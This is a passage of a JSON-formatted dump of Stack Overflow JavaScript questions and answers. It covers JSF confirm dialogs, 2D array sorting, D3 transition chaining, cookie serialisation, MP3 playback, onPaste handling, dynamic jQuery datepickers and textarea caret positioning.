                    "body": "<p>If you want to execute something before the form is posted, for confirmation for example, try the form event onSubmit.  Something like:</p>\n\n<pre><code>myform.onsubmit = function(){confirm(\"really really sure?\")};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>This never worked for me, </p>\n\n<pre><code> onclick=\"if(confirm('Are you sure?')) return false;\" /&gt;\n</code></pre>\n\n<p>but this did</p>\n\n<pre><code>onclick=\"if(confirm(\\\"Are you sure?\\\"))return true; else return false;\"\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Can be simplified like this</p>\n\n<pre><code>onclick=\"return confirm('Are you sure?');\"\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<pre><code>var deleteClick;\nvar mess=\"xxx\";\nfunction assignDeleteClick(link) {\n    if (link.onclick == confirmDelete) {\n        return;\n    }\n    deleteClick = link.onclick;\n    link.onclick = confirmDelete;\n}\n\n\nfunction confirmDelete() {\n    var ans = confirm(mess);\n    if (ans == true) {\n        return deleteClick();\n    } else {\n        return false;\n    }\n} \n</code></pre>\n\n<p>use this code for jsf 1.1.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>This worked for me:</p>\n\n<pre><code>&lt;h:commandButton title=\"#{bundle.NewPatient}\" action=\"#{identifController.prepareCreate}\"  \n                                             id=\"newibutton\" \n                                             onclick=\"if(confirm('#{bundle.NewPatient}?'))return true; else return false;\" \n                                             value=\"#{bundle.NewPatient}\"/&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>If you have a JSF  (which uses the onclick event of an  to submit the current form), how do you execute Javascript (such as asking for delete confirmation) prior to the action being performed?</p>\n",
            "last_activity_date": 1306253252,
            "question_id": 73628,
            "score": 8,
            "tags": [
                "javascript",
                "jsf"
            ],
            "title": "How can I execute Javascript before a JSF &lt;h:commandLink&gt; action is performed?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<pre><code>var arr = [[12, 'AAA'],[58, 'BBB'],[28, 'CCC'],[18, 'DDD']];\n\narr = arr.sort(function(a,b) {\n  return a[0] &gt; b[0];\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>try this</p>\n\n<pre><code>//WITH FIRST COLUMN\n     arr = arr.sort(function(a,b) {\n      return a[0] &gt; b[0];\n    });\n\n\n//WITH SECOND COLUMN\narr = arr.sort(function(a,b) {\n return a[1] &gt; b[1];\n });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>It's this simple:</p>\n\n<pre><code>var a = [[12, 'AAA'], [58, 'BBB'], [28, 'CCC'],[18, 'DDD']];\n\na.sort(sortFunction);\n\nfunction sortFunction(a, b) {\n    if (a[0] === b[0]) {\n        return 0;\n    }\n    else {\n        return (a[0] &lt; b[0]) ? -1 : 1;\n    }\n}\n</code></pre>\n\n<p>I invite you to <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort\">read the documentation</a>.</p>\n\n<p>If you want to sort by the second column, you can do this:</p>\n\n<pre><code>a.sort(compareSecondColumn);\n\nfunction compareSecondColumn(a, b) {\n    if (a[1] === b[1]) {\n        return 0;\n    }\n    else {\n        return (a[1] &lt; b[1]) ? -1 : 1;\n    }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p>The best approach would be to use the following, as there may be repetitive values in the first column. </p>\n\n<pre><code>    var arr = [[12, 'AAA'], [12, 'BBB'], [12, 'CCC'],[28, 'DDD'], [18, 'CCC'],[12, 'DDD'],[18, 'CCC'],[28, 'DDD'],[28, 'DDD'],[58, 'BBB'],[68, 'BBB'],[78, 'BBB']];\n    arr.sort(function(a,b) {\n        return a[0]-b[0]\n    });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>None of these previous answers worked for me or even on JSFiddle for some reason, but this did:</p>\n\n<pre><code>var arr = [[12, 'AAA'], [58, 'BBB'], [28, 'CCC'],[18, 'DDD']];\n\nfunction sort_by_column(a,b)\n{\n    return ((a[0] &lt; b[0]) ? -1 : ((a[0] &gt; b[0]) ? 1 : 0)); // a[1] for col. 2 etc...\n}\n\narr.sort(sort_by_column);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Can any one help me sort a 2 dimensional Array in JavaScript?</p>\n\n<p>It will have data in the following format:</p>\n\n<pre><code>[12, AAA]\n[58, BBB]\n[28, CCC]\n[18, DDD]\n</code></pre>\n\n<p>It should look like this when sorted:</p>\n\n<pre><code>[12, AAA]\n[18, DDD]\n[28, CCC]\n[58, BBB]\n</code></pre>\n\n<p>So basically, sorting by the first column. </p>\n\n<p>Cheers</p>\n",
            "last_activity_date": 1402070922,
            "question_id": 16096872,
            "score": 7,
            "tags": [
                "javascript",
                "arrays",
                "sorting",
                "multidimensional-array"
            ],
            "title": "How to sort 2 dimensional array by column value?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>The transition are easier to chain since d3.v3 without using \"end\". See the notes <a href=\"https://github.com/mbostock/d3/wiki/3.0#transitions\">here</a>.</p>\n\n<p>For example, look at <a href=\"http://bl.ocks.org/mbostock/3943967\">this one</a>:</p>\n\n<pre><code>rect.transition()\n  .duration(500)\n  .delay(function(d, i) { return i * 10; })\n  .attr(\"x\", function(d, i, j) { return x(d.x) + x.rangeBand() / n * j; })\n  .attr(\"width\", x.rangeBand() / n)\n  .transition()\n  .attr(\"y\", function(d) { return y(d.y); })\n  .attr(\"height\", function(d) { return height - y(d.y); });\n</code></pre>\n\n<p>That's for transitions on the same element. For different elements, look at <a href=\"http://bl.ocks.org/mbostock/3903818\">this one</a>.</p>\n\n<pre><code>// First transition the line &amp; label to the new city.\nvar t0 = svg.transition().duration(750);\nt0.selectAll(\".line\").attr(\"d\", line);\nt0.selectAll(\".label\").attr(\"transform\", transform).text(city);\n\n// Then transition the y-axis.\ny.domain(d3.extent(data, function(d) { return d[city]; }));\nvar t1 = t0.transition();\nt1.selectAll(\".line\").attr(\"d\", line);\nt1.selectAll(\".label\").attr(\"transform\", transform);\nt1.selectAll(\".y.axis\").call(yAxis);\n</code></pre>\n\n<p>The transition is attached to the svg element and chained from there.</p>\n",
                    "is_accepted": true,
                    "score": 13
                }
            ],
            "body": "<h3>What I'm trying to do...</h3>\n\n<p>I'm toying with D3 to make a compound animation. I have the following final state:</p>\n\n<p><img src=\"http://i.stack.imgur.com/f2zCe.png\" alt=\"enter image description here\"></p>\n\n<p>Essentially I want to animation connecting the dots - add the first <em>circle</em>. Then draw the <em>line</em> to the second circle. Once the line is drawn, the second circle is added.</p>\n\n<p>To add some visual appeal, I perform other transitions, such as changing <em>circle</em> radius for the first and second circle as the line is draw.</p>\n\n<h3>What I've tried...</h3>\n\n<p>I can add the circles and draw the line individually, including animations. However, I'm not sure how to proceed with chaining the transitions together to form the compound animation.</p>\n\n<p>I've <a href=\"http://blog.visual.ly/creating-animations-and-transitions-with-d3-js/\">read about transitions/animations</a>, which suggests using <code>each(\"end\")</code>. While this would work to draw the initial objects, end doesn't fire until after the other transitions.</p>\n\n<h3>Questions</h3>\n\n<ul>\n<li>Is using <code>each(\"end\", ...)</code> the correct approach for chaining transitions?</li>\n<li>How do I start another animation (i.e. start draw the line) while still allowing another transition to complete (i.e. the first circle radius burst).</li>\n</ul>\n",
            "last_activity_date": 1367595095,
            "question_id": 15794619,
            "score": 7,
            "tags": [
                "javascript",
                "animation",
                "d3.js",
                "transitions",
                "chained"
            ],
            "title": "D3.js chain transitions for compound animations for different shapes"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>If you can serialize your object into its canonical string representation, and can unserialize it back into its object form from said string representation, then yes you can put it into a cookie.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Use either object's own <code>.toString()</code> method if it gives meaningful serialization or <code>JSON.stringify()</code>. Do note, however, that cookies are usually limited in length and won't be able to hold big amounts of data.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Try that one to write</p>\n\n<pre><code>function bake_cookie(name, value) {\n  var cookie = [name, '=', JSON.stringify(value), '; domain=.', window.location.host.toString(), '; path=/;'].join('');\n  document.cookie = cookie;\n}\n</code></pre>\n\n<p>To read it take:</p>\n\n<pre><code>function read_cookie(name) {\n var result = document.cookie.match(new RegExp(name + '=([^;]+)'));\n result &amp;&amp; (result = JSON.parse(result[1]));\n return result;\n}\n</code></pre>\n\n<p>To delete it take:</p>\n\n<pre><code>function delete_cookie(name) {\n  document.cookie = [name, '=; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/; domain=.', window.location.host.toString()].join('');\n}\n</code></pre>\n\n<p>To serialize complex objects / instances, why not write a data dump function in your instance:</p>\n\n<pre><code>function userConstructor(name, street, city) {\n   // ... your code\n   this.dumpData = function() {\n     return {\n        'userConstructorUser': {\n            name: this.name,\n            street: this.street,\n            city: this.city\n         }\n       }\n    }\n</code></pre>\n\n<p>Then you dump the data, stringify it, write it to the cookie, and next time you want to use it just go:</p>\n\n<pre><code>  var mydata = JSON.parse(read_cookie('myinstances'));\n  new userConstructor(mydata.name, mydata.street, mydata.city);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 10
                }
            ],
            "body": "<p>No jQuery. </p>\n\n<p>I want to store an object or array in a cookie.</p>\n\n<p>The object should be usable after page refresh.</p>\n\n<p>How do I do that with pure JavaScript? I read many posts, but do not know how to serialize appropriately.</p>\n\n<hr>\n\n<p>EDIT:\nCode:</p>\n\n<pre><code>var instances = {};\n...\ninstances[strInstanceId] = { container: oContainer };\n...\ninstances[strInstanceId].plugin = oPlugin;\n...\nJSON.stringify(instances); \n// throws error 'TypeError: Converting circular structure to JSON'\n</code></pre>\n\n<ol>\n<li><p>How do I serialize <code>instances</code>?</p></li>\n<li><p>How do I maintain functionality, but change structure of instance to be able to serialize with <code>stringify</code>?</p></li>\n</ol>\n",
            "last_activity_date": 1387498082,
            "question_id": 11344531,
            "score": 7,
            "tags": [
                "javascript",
                "object",
                "cookies"
            ],
            "title": "Pure Javascript - store object in cookie"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p>You can use <a href=\"https://developer.mozilla.org/en/HTML/Element/audio\" rel=\"nofollow\"><code>&lt;audio&gt;</code></a> HTML5 tag to play audio using JavaScript.</p>\n\n<p>But this is not cross-browser solution. It supported only in modern browsers. For cross-browser compatibility you probably need to use Flash for that (for example <a href=\"http://www.jplayer.org/\" rel=\"nofollow\">jPlayer</a>).</p>\n\n<p>Browsers compatibility table is provided at link I mentioned above.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Try this audio player script generator :</p>\n\n<p><a href=\"http://www.scriptgenerator.net/44/Audio-player-script-generator/\" rel=\"nofollow\">http://www.scriptgenerator.net/44/Audio-player-script-generator/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You will probably want to use the new HTML5 <code>audio</code> element to create an <code>Audio</code> object, load the mp3, and play it.</p>\n\n<p>Due to browser inconsistencies, this sample code is a bit lengthly, but it should suit your needs with a bit of tweaking.</p>\n\n<pre><code>//Create the audio tag\nvar soundFile = document.createElement(\"audio\");\nsoundFile.preload = \"auto\";\n\n//Load the sound file (using a source element for expandability)\nvar src = document.createElement(\"source\");\nsrc.src = fileName + \".mp3\";\nsoundFile.appendChild(src);\n\n//Load the audio tag\n//It auto plays as a fallback\nsoundFile.load();\nsoundFile.volume = 0.000000;\nsoundFile.play();\n\n//Plays the sound\nfunction play() {\n   //Set the current time for the audio file to the beginning\n   soundFile.currentTime = 0.01;\n   soundFile.volume = volume;\n\n   //Due to a bug in Firefox, the audio needs to be played after a delay\n   setTimeout(function(){soundFile.play();},1);\n}\n</code></pre>\n\n<p>Edit:</p>\n\n<p>To add Flash support, you would append an <code>object</code> element inside the <code>audio</code> tag.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You could try <a href=\"http://www.schillmania.com/projects/soundmanager2/\" rel=\"nofollow\">SoundManager 2</a>: it will transparently handle the <code>&lt;audio&gt;</code> tag wherever it's supported, and use Flash wherever it isn't.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Assuming that the browser supports MP3 playback and is fairly new to support newer JavaScript features, I would suggest taking a look at <a href=\"http://www.jplayer.org/\" rel=\"nofollow\">jPlayer</a>.\nYou can see a short demo <a href=\"http://www.jplayer.org/latest/demo-01-supplied-mp3/\" rel=\"nofollow\">tutorial</a> on how to implement it.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><code>new Audio('&lt;url&gt;').play()</code></p>\n",
                    "is_accepted": false,
                    "score": 13
                },
                {
                    "body": "<p>If you want a version that works for old browser, I have made this library:</p>\n\n<pre><code>function Sound(source,volume,loop)\n{\n    this.source=source;\n    this.volume=volume;\n    this.loop=loop;\n    var son;\n    this.son=son;\n    this.finish=false;\n    this.stop=function()\n    {\n        document.body.removeChild(this.son);\n    }\n    this.start=function()\n    {\n        if(this.finish)return false;\n        this.son=document.createElement(\"embed\");\n        this.son.setAttribute(\"src\",this.source);\n        this.son.setAttribute(\"hidden\",\"true\");\n        this.son.setAttribute(\"volume\",this.volume);\n        this.son.setAttribute(\"autostart\",\"true\");\n        this.son.setAttribute(\"loop\",this.loop);\n        document.body.appendChild(this.son);\n    }\n    this.remove=function()\n    {\n        document.body.removeChild(this.son);\n        this.finish=true;\n    }\n    this.init=function(volume,loop)\n    {\n        this.finish=false;\n        this.volume=volume;\n        this.loop=loop;\n    }\n}\n</code></pre>\n\n<p>Documentation:</p>\n\n<p><code>Sound</code> takes three arguments. The url of the sound, the volume (from 0 to 100), and the loop (true to loop, false not to loop).<br>\n<code>stop</code> allow to <code>start</code> after (contrary to <code>remove</code>).<br>\n<code>init</code> re-set the argument volume and loop.</p>\n\n<p>Example:</p>\n\n<pre><code>var foo=new Sound(\"url\",100,true);\nfoo.start();\nfoo.stop();\nfoo.start();\nfoo.init(100,false);\nfoo.remove();\n//Here you you cannot start foo any more\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 5
                },
                {
                    "body": "<p>Enjoy it ;)</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Play my music....&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;ul&gt;\n        &lt;li&gt;\n        &lt;a id=\"PlayLink\" href=\"http://www.moderntalking.ru/real/music/Modern_Talking-You_Can_Win(DEMO).mp3\" onclick=\"pplayMusic(this, 'music_select');\"&gt;U Can Win&lt;/a&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n        &lt;a id=\"A1\" href=\"http://www.moderntalking.ru/real/music/Modern_Talking-Brother_Louie(DEMO).mp3\" onclick=\"pplayMusic(this, 'music_select');\"&gt;Brother Louie&lt;/a&gt;\n        &lt;/li&gt;\n    &lt;/ul&gt;\n&lt;script type=\"text/javascript\" src=\"http://mediaplayer.yahoo.com/js\"&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Jquery plugin for audio mp3 player <a href=\"http://www.jplayer.org/0.2.1/demos/\" rel=\"nofollow\">http://www.jplayer.org/0.2.1/demos/</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have a directory on my website with several mp3's.\nI dinamically create a list of them in the website using php.</p>\n\n<p>I also have a drag and drop function associated to them and I can select a list of those mp3 to play.</p>\n\n<p>Now, giving that list, how can I click on a button (Play) and make the website play the first mp3 of the list? (I also know where the music is on the website)</p>\n",
            "last_activity_date": 1341485951,
            "question_id": 11330917,
            "score": 7,
            "tags": [
                "javascript",
                "html",
                "mp3"
            ],
            "title": "How to play a mp3 using Javascript?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>The <code>onpaste</code> event fires before the <code>input</code>'s <code>value</code> is changed. You need something such as a <a href=\"https://developer.mozilla.org/en/DOM/window.setTimeout\"><code>setTimeout</code></a>:</p>\n\n<pre><code>&lt;input type=\"text\" placeholder=\"Paste text\" onPaste=\"var e=this; setTimeout(function(){alert(e.value);}, 4);\"&gt;\u200b\n</code></pre>\n\n<p>I'm storing a reference to <code>this</code> inside a global var as <code>this</code> is not accessible inside the scope of a timeout function which is attached to the window object.</p>\n\n<p>I'm using 4 miliseconds as the Timeout as it's the minimum valid Interval/Timeout in the HTML5 specification. <strong>Edit:</strong> As noted in the comments, you may also use <code>0</code> miliseconds as timeOut which is automatically recalculated to <code>4</code>. <a href=\"http://jsperf.com/smallest-timeout/8\"><strong>jsPerf tests</strong></a>.</p>\n\n<p><a href=\"http://jsfiddle.net/ult_combo/HzkCw/\"><strong><em>Fiddle</em></strong></a></p>\n\n<p>You may as well use a function call inside your <code>onpaste</code> event passing <code>this</code> as a parameter to prevent your HTML mixing with JS too much. :)</p>\n\n<p>And here's a function easier to read and which you can use in multiple inputs:</p>\n\n<pre><code>function pasted(element) {\n    setTimeout(function(){\n        alert(element.value);\n    }, 0); //or 4\n}\u200b\n</code></pre>\n\n<p>Which can be called with simply <code>onPaste=\"pasted(this)\"</code> for any input.</p>\n\n<p><a href=\"http://jsfiddle.net/ult_combo/HzkCw/1/\"><strong><em>Fiddle</em></strong></a></p>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>This is because the <code>onpaste</code> event fires <strong>before</strong> the content gets pasted into the element (<a href=\"http://help.dottoro.com/ljuimtmq.php\" rel=\"nofollow\">link</a>) so it's not there yet at the time you handle it.</p>\n\n<p>Modern browsers support methods of obtaining clipboard data inside the event handler. Refer to <a href=\"http://stackoverflow.com/questions/2176861/javascript-get-clipboard-data-on-paste-event-cross-browser\">JavaScript get clipboard data on paste event (Cross browser)</a> for cross-browser solution attempts.</p>\n\n<p>Also, you can always work around your issue by simply starting a timer in the event handler function (10ms should be enough) that would check your input value later.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>I have this right now:</p>\n\n<p><code>&lt;input type=\"text\" placeholder=\"Paste text\" onPaste=\"alert(this.value);\"&gt;</code></p>\n\n<p>This does infact work, except, it returns a blank alert window. I don't get any value. Help?</p>\n",
            "last_activity_date": 1339369580,
            "question_id": 10972954,
            "score": 7,
            "tags": [
                "javascript",
                "input",
                "copy-paste"
            ],
            "title": "Javascript OnPaste"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>The jQuery code is executed when the document is ready: this means when the initial markup of your page is ready, not after your javascript files ran.</p>\n\n<p>I suppose your code to initialize the datepickers runs <strong>before</strong> your script creating the elements does, so nothing happens.</p>\n\n<hr>\n\n<p>Try executing you jquery code when the page has loaded using <a href=\"http://api.jquery.com/load-event/\" rel=\"nofollow\">.load()</a> instead of .ready(). The load event is fired when all assets (js, image...) have loaded.</p>\n\n<pre><code>$(window).load(function () {\n    $(\".datepicker\").datepicker({\n        ...\n    });\n});\n</code></pre>\n\n<hr>\n\n<p>You could also simply use the way javascript is executed. Scripts are executed in the order they happen in the page. So you could:</p>\n\n<ul>\n<li>move your scripts right before the closing body tag ```</li>\n<li>make sure your first script (creating the elements) comes before the datepicker code</li>\n<li>remove the .ready() handler for the date picker. When you place your script at the end, they are implicitly running when the DOM is ready...</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>It's probably a matter of in which order the javascript is being fired. Try putting </p>\n\n<pre><code>$(\".datepicker\").datepicker({\n    dateFormat: 'yy/m/d',\n    firstDay: 1,\n    changeMonth: true,\n    changeYear: true,\n    showOn: 'both',\n    autosize: true,\n    buttonText: \"Select date\",\n    buttonImage: '../Content/images/calendar.png',\n    buttonImageOnly: true\n});\n</code></pre>\n\n<p>After your javascript that creates the html.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>When you write </p>\n\n<pre><code>$(document).ready(function () {\n    $(\".datepicker\").datepicker({...});\n});\n</code></pre>\n\n<p>This fragment is getting executed right after the page has loaded. Therefore, your dynamic datepickers are not there yet. You need to call <code>$(aSuitableSelector).datepicker(...)</code> on each newly-inserted element. First, use a var to hold your options:</p>\n\n<pre><code>var datePickerOptions = {\n    dateFormat: 'yy/m/d',\n    firstDay: 1,\n    changeMonth: true,\n    changeYear: true,\n    // ...\n}\n</code></pre>\n\n<p>This allows you to write </p>\n\n<pre><code> $(document).ready(function () {\n    $(\".datepicker\").datepicker(datePickerOptions);\n });\n</code></pre>\n\n<p>and to write      </p>\n\n<pre><code> // right after appending dateFrom to the document ...\n $(dateFrom).datepicker(datePickerOptions);\n\n //...\n\n // right after appending dateTo ...\n $(dateTo).datepicker(datePickerOptions);\n</code></pre>\n\n<p>You can also use JQuery's ability to <a href=\"http://stackoverflow.com/questions/1091661/detect-element-content-changes-with-jquery\">listen to DOM changes</a> to avoid having to apply JS magic to newly-inserted elements -- but I do not think it is worth it.</p>\n",
                    "is_accepted": true,
                    "score": 11
                },
                {
                    "body": "<p>The code that bind the datepickers is best to be executed right after your html is dinamically created. If you want to keep the code for datepicker initialization in a separate file, I would recommend the following approach:\nAfter you finish generating your html (I presume it is generated on document ready), use</p>\n\n<pre><code>$(document).trigger(\"customHtmlGenerated\");\n</code></pre>\n\n<p>And in the datepicker file, instead of <code>$(document).ready(function(){...})</code> use <code>$(document).bind(\"customHtmlGenerated\", function(){...});</code></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The easiest way I found to fix this issue is by using the livequery plugin:</p>\n\n<p><a href=\"http://docs.jquery.com/Plugins/livequery\" rel=\"nofollow\">http://docs.jquery.com/Plugins/livequery</a></p>\n\n<p>Instead of applying the datepickers to all objects of a specific class, you tell LiveQuery to apply it to those objects. LiveQuery will in turn <strong>keep applying</strong> the datepicker, even when your DOM is changed later on.</p>\n\n<p>I have seen no performance drops when usnig this, and the code changes are really minimal (you need to add the plugin to the page and only change one line of code).</p>\n\n<p>You would be using it like so:</p>\n\n<pre><code>$(\".datepicker\").livequery(\n        function(){ \n            // This function is called when a new object is found. \n            $(this).datepicker({ ...}});\n        }, \n        function() { \n            // This function is called when an existing item is being removed. I don't think you need this one so just leave it as an empty function.\n        }\n); \n</code></pre>\n\n<p>From then on, every time you add an object with the datepicker class, the datepicker plugin will automatically be applied to it.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm creating dynamically a couple of div with inner controls. Two of those controls should be datepickers. But for some reason they are not showing (only input text are shown)\n   It works if I create static html, but not when I'm using dynamic one.</p>\n\n<p>This is the code I'm using to generate the HTML (I can see the div)</p>\n\n<pre><code>var ShowContainerDiv = document.createElement('DIV');\n\nvar btnShowDiv = document.createElement('DIV');\nbtnShowDiv.id = 'btnShowDiv ';\nbtnShowDiv.title = 'Change';\nbtnShowDiv.index = 120;\n\nvar lblShow = document.createElement('label')\nlblShow.htmlFor = \"btnShowDiv\";\nlblShow.appendChild(document.createTextNode('Show'));\nbtnShowDiv.appendChild(lblShow );\nbtnShowDiv.onclick = function () {\n    dropdown.style.visibility = \"visible\";\n};\n\nvar dropdown = document.createElement('DIV');\ndropdown.style.backgroundColor = 'white';\ndropdown.style.borderStyle = 'solid';\ndropdown.style.borderWidth = '2px';\ndropdown.style.cursor = 'pointer';\ndropdown.style.textAlign = 'left';\ndropdown.style.width = '150px';\n\nvar chkRed = document.createElement(\"input\");\nchkRed.type = \"checkbox\";\nchkRed.id = \"chkRed\";\nchkRed.value = \"Red\";\nchkRed.checked = false;\nvar lblRed = document.createElement('label')\nlblRed.htmlFor = \"chkRed\";\nlblRed.style.color = \"#F00\";\nlblRed.appendChild(document.createTextNode('Red'));\n\nvar chkYellow = document.createElement(\"input\");\nchkYellow.type = \"checkbox\";\nchkYellow.id = \"chkYellow\";\nchkYellow.value = \"Yellow\";\nchkYellow.checked = false;\nvar lblYellow = document.createElement('label')\nlblYellow.htmlFor = \"chkYellow\";\nlblYellow.style.color = \"#FF0\";\nlblYellow.appendChild(document.createTextNode('Yellow'));\n\nvar chkGreen = document.createElement(\"input\");\nchkGreen.type = \"checkbox\";\nchkGreen.id = \"chkGreen\";\nchkGreen.value = \"Green\";\nchkGreen.checked = false;\nvar lblGreen = document.createElement('label')\nlblGreen.htmlFor = \"chkGreen\";\nlblGreen.style.color = \"#0F0\";\nlblGreen.appendChild(document.createTextNode('Green'));\n\nvar dateFrom = document.createElement(\"input\");\ndateFrom.id = \"txtDateFrom\";\ndateFrom.type = \"text\";\ndateFrom.className = \"datepicker\";\ndateFrom.style.width = \"70px\";\ndateFrom.readonly = \"readonly\";\nvar lblDateFrom = document.createElement('label')\nlblDateFrom.htmlFor = \"txtDateFrom\";\nlblDateFrom.appendChild(document.createTextNode('From'));\n\nvar dateTo = document.createElement(\"input\");\ndateTo.id = \"txtDateTo\";\ndateTo.type = \"text\";\ndateTo.className = \"datepicker\";\ndateTo.style.width = \"70px\";\ndateTo.readonly = \"readonly\";\nvar lblDateTo = document.createElement('label')\nlblDateTo.htmlFor = \"txtDateTo\";\nlblDateTo.appendChild(document.createTextNode('To'));\n\nvar btnDone = document.createElement(\"input\");\nbtnDone.type = \"button\";\nbtnDone.name = \"btnDone\";\nbtnDone.value = \"Done\";\nbtnDone.onclick = function () {\n    dropdown.style.visibility = \"hidden\";\n};\n\ndropdown.appendChild(chkRed);\ndropdown.appendChild(lblRed);\ndropdown.appendChild(document.createElement(\"BR\"));\ndropdown.appendChild(chkYellow);\ndropdown.appendChild(lblYellow);\ndropdown.appendChild(document.createElement(\"BR\"));\ndropdown.appendChild(chkGreen);\ndropdown.appendChild(lblGreen);\ndropdown.appendChild(document.createElement(\"BR\"));\ndropdown.appendChild(dateFrom);\ndropdown.appendChild(document.createElement(\"BR\"));\ndropdown.appendChild(dateTo);\ndropdown.appendChild(document.createElement(\"BR\"));\ndropdown.appendChild(btnDone);\n\nShowContainerDiv.appendChild(btnShowDiv);\nShowContainerDiv.appendChild(dropdown);\n\ng.event.addDomListener(btnShowDiv, 'click', function () {\n    dropdown.visible = true;\n    dropdown.style.visibility = \"visible\";\n});\n\ng.event.addDomListener(btnDone, 'click', function () {\n    dropdown.visible = false;\n    dropdown.style.visibility = \"hidden\";\n});\n\nmap.controls[g.ControlPosition.TOP_RIGHT].push(ShowContainerDiv);\n</code></pre>\n\n<p>Then in a .js file I have this (I checked and I'm including the file)</p>\n\n<pre><code>$(document).ready(function () {\n    $(\".datepicker\").datepicker({\n        dateFormat: 'yy/m/d',\n        firstDay: 1,\n        changeMonth: true,\n        changeYear: true,\n        showOn: 'both',\n        autosize: true,\n        buttonText: \"Select date\",\n        buttonImage: '../Content/images/calendar.png',\n        buttonImageOnly: true\n    });\n});\n</code></pre>\n\n<p>Why the datepicker is not showing up?\nThanks! Guillermo.</p>\n",
            "last_activity_date": 1377360946,
            "question_id": 9640493,
            "score": 7,
            "tags": [
                "javascript",
                "jquery",
                "jquery-plugins",
                "jquery-ui-datepicker"
            ],
            "title": "jquery datepicker not working on dynamically created html"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Here's a plug-in for this: <a href=\"http://www.jquery-plugin.buss.hk/my-plugins/jquery-caret-plugin\" rel=\"nofollow\">jQuery caret plugin</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>This \"raw code\" works at least in IE.</p>\n\n<p>Using the code you can put your <code>&lt;TEXTAREA&gt;</code> where ever you want in page, and the <code>&lt;DIV id=\"db\"&gt;</code> will follow it. Even despite of the scrolling position of the page. You can fix the position of <code>&lt;DIV&gt;</code> by changing the literal numbers at <code>d.style...6</code>-statements.</p>\n\n<pre><code>&lt;body&gt;\n&lt;div id=\"db\" style=\"position:absolute;left:-20px;top:-20px;border:1px solid red;\"&gt;V&lt;/div&gt;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&lt;form id=\"props\"&gt;\n&lt;textarea id=\"ta\" style=\"width:200px;height:100px;\" onkeyup=\"moveDiv();\"&gt;&lt;/textarea&gt;\n&lt;/form&gt;\n\n&lt;script&gt;\n&lt;!--\nvar b=document.body;\nvar d=document.getElementById('db');\nvar a=document.getElementById('ta');\n\nfunction moveDiv(){\n    var sel=document.selection;\n    var targ=sel.createRange();\n    d.style.top=a.offsetTop+a.clientTop-d.clientHeight-6;\n    d.style.left=targ.offsetLeft+b.scrollLeft-6;\n    return;\n}\n// --&gt;\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre>\n\n<p>Positioning of the <code>&lt;DIV&gt;</code> is not quite exact, but gets better when using fixed-width font in <code>&lt;TEXTAREA&gt;</code>.</p>\n",
                    "is_accepted": true,
                    "score": 2
                },
                {
                    "body": "<p>There is an implemention: <a href=\"https://github.com/beviz/jquery-caret-position-getter\" rel=\"nofollow\">https://github.com/beviz/jquery-caret-position-getter</a>, it can gets caret position in <strong>textarea</strong>(i.e.x,y)</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
